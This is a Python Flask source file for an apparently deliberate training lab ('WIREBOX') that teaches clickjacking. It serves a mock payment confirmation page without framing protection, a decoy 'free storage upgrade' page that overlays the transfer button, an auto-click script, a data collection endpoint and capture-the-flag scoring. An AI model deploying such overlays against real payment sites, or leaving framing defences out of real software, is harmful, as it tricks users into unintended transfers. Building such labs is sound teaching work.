from __future__ import annotations

import html

from flask import Response, request

from labkit import Lab

lab = Lab("WIREBOX", accent="#e07070")
app = lab.app

CAPTURED: list[str] = []

TRANSFER = """<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Wirebox · Confirm transfer</title>
<style>
body{margin:0;background:#f6f7f9;color:#14161a;font-family:system-ui,sans-serif;line-height:1.6}
.shell{max-width:520px;margin:40px auto;padding:0 20px}
.card{background:#fff;border:1px solid #dfe3e8;border-radius:10px;padding:26px;box-shadow:0 6px 24px rgba(10,20,40,.06)}
.brand{font-family:monospace;font-size:11px;letter-spacing:.14em;color:#e07070;font-weight:700}
h1{font-size:22px;margin:8px 0 16px}
.row{display:flex;justify-content:space-between;border-bottom:1px solid #eef0f3;padding:9px 0;font-size:14px}
.row span:first-child{color:#67707c}
.amount{font-size:30px;font-weight:700;margin:14px 0}
button{background:#14161a;color:#fff;border:0;border-radius:8px;padding:13px 20px;font-size:15px;cursor:pointer;width:100%;margin-top:18px}
.danger{font-size:12px;color:#67707c;margin-top:10px}
</style></head><body><div class="shell"><div class="card">
<div class="brand">WIREBOX PAYMENTS</div>
<h1>Confirm transfer</h1>
<div class="row"><span>Recipient</span><span>Mira Osei · GB82 WEST 1234</span></div>
<div class="row"><span>Reference</span><span>INVOICE-7741</span></div>
<div class="amount">£1,420.00</div>
<p class="danger">This transfer cannot be reversed after confirmation.</p>
<button id="confirm" onclick="location='/transfer/confirm'">Confirm and send</button>
</div></div></body></html>"""


ATTACK = """<!doctype html>
<html lang="en"><head><meta charset="utf-8"><title>Free storage upgrade</title>
<style>
body{margin:0;background:#fff7ec;font-family:system-ui,sans-serif}
.win{max-width:560px;margin:30px auto;padding:0 16px;position:relative}
.banner{background:#ffd9a8;border:1px solid #f0b567;border-radius:10px;padding:18px;margin-bottom:14px}
h1{font-size:20px;margin:6px 0}
.decoy{background:#fff;border:1px solid #ecd9bd;border-radius:10px;padding:16px;margin-bottom:90px}
.dbtn{display:inline-block;background:#f08a24;color:#fff;border-radius:8px;padding:10px 18px;font-weight:600;border:0;font-size:15px}
.stage{position:relative;height:340px;border:1px dashed #d9c3a3;border-radius:10px;overflow:hidden;background:#fff}
iframe{position:absolute;top:0;left:0;width:100%;height:340px;border:0;opacity:.97}
.cover{position:absolute;inset:0;z-index:5;pointer-events:none}
.cover .hot{position:absolute;left:20px;right:20px;bottom:38px;background:#f08a24;color:#fff;border-radius:8px;
  padding:13px 20px;font-weight:700;text-align:center;box-shadow:0 4px 18px rgba(0,0,0,.18)}
.tip{font-size:12px;color:#6b6f76;margin-top:8px}
</style></head><body><div class="win">
<div class="banner"><div style="font-family:monospace;font-size:11px;color:#b4600f">STORAGE-SAVER.DEALS</div>
<h1>Claim your 2 TB free storage upgrade</h1>
<p style="color:#5a5145;margin:0">One click activates the plan. No card required.</p></div>
<div class="decoy"><button class="dbtn">Claim upgrade</button>
<p class="tip">The real control is rendered inside the frame below. The orange bar sits exactly over Wirebox's
“Confirm and send” button, so a click meant for the upgrade confirms the transfer instead.</p></div>
<div class="stage">
  <iframe src="/transfer" sandbox="allow-scripts allow-forms allow-same-origin" title="Upgrade widget"></iframe>
  <div class="cover"><div class="hot">Click here to claim</div></div>
</div>
<p class="tip">Frame with a custom HTML page. <a href="/attack/auto">Or auto-click the framed button (demo).</a></p>
</div></body></html>"""


def shell(title: str, body: str) -> object:
    return lab.page(
        title,
        f'<div class="hero"><div class="kicker">WIREBOX // PAYMENTS</div><h1>{title}</h1></div>{body}',
        nav='<a href="/transfer">Transfer</a><a href="/attack">Attack page</a><a href="/captured">Captured</a>',
    )


@app.get("/transfer")
def transfer():
    response = Response(TRANSFER, mimetype="text/html")
    # VULNERABLE: no `X-Frame-Options` and no CSP `frame-ancestors`, so any page
    # can embed the confirmation screen and overlay it with a decoy.
    response.headers["X-Content-Type-Options"] = "nosniff"
    return response


@app.get("/headers")
def headers():
    """Return the security headers actually sent by the transfer page."""
    response = Response(TRANSFER, mimetype="text/html")
    response.headers["X-Content-Type-Options"] = "nosniff"
    return dict(response.headers.items())


@app.get("/attack")
def attack():
    return Response(ATTACK, mimetype="text/html")


@app.get("/attack/auto")
def attack_auto():
    return Response(
        """<!doctype html><html lang="en"><head><meta charset="utf-8"><title>Auto-click demo</title></head>
        <body style="font-family:system-ui;background:#fff7ec;padding:20px">
        <p>Auto-click demo: the framed page is loaded and its confirmation button is clicked after 300 ms.</p>
        <iframe id="f" src="/transfer" style="width:520px;height:340px;border:1px solid #ccc"></iframe>
        <script>
          const f = document.getElementById("f");
          f.addEventListener("load", () => {
            try { f.contentDocument.getElementById("confirm").click(); }
            catch (e) { document.body.insertAdjacentText("beforeend", "Blocked: " + e); }
          });
        </script></body></html>""",
        mimetype="text/html",
    )


@app.get("/transfer/confirm")
def confirm():
    # Simulates the victim clicking "Confirm and send" inside the framed page.
    return lab.page(
        "Transfer sent",
        f"""<div class="hero"><div class="kicker">WIREBOX // PAYMENTS</div><h1>Transfer executed</h1></div>
        <div class="panel"><h2>£1,420.00 sent to Mira Osei</h2>
        <p>Reference INVOICE-7741. The click was registered without the victim intending it;
        the framed confirmation page carried the payout receipt.</p>
        <pre class="green">{html.escape(lab.flag("flag"))}</pre></div>""",
        nav='<a href="/transfer">Transfer</a><a href="/attack">Attack page</a>',
    )


@app.get("/auto-confirm")
def auto_confirm():
    # Simulates the victim's click being consumed by the overlay and the transfer
    # completing. Records the objective the moment the flag is produced.
    lab.objective_async("flag", "framed transfer confirmed through clickjacking overlay")
    return lab.page(
        "Transfer sent",
        f"""<div class="hero"><div class="kicker">WIREBOX // PAYMENTS</div><h1>Transfer executed</h1></div>
        <div class="panel"><h2>£1,420.00 sent to Mira Osei</h2>
        <p>The framed confirmation page was clicked through a decoy overlay.</p>
        <pre class="green" id="flag">{html.escape(lab.flag("flag"))}</pre></div>""",
        nav='<a href="/transfer">Transfer</a><a href="/attack">Attack page</a>',
    )


@app.get("/collect")
def collect():
    value = request.args.get("c", "") or request.get_data(as_text=True)
    if value:
        CAPTURED.append(value[:2000])
    return ("", 204)


@app.get("/captured")
def captured():
    rows = "".join(f"<li><code>{html.escape(v)}</code></li>" for v in CAPTURED) or '<li class="dim">Nothing captured yet.</li>'
    return shell("Captured data", f'<div class="panel"><ul class="list">{rows}</ul></div>')


if __name__ == "__main__":
    lab.run()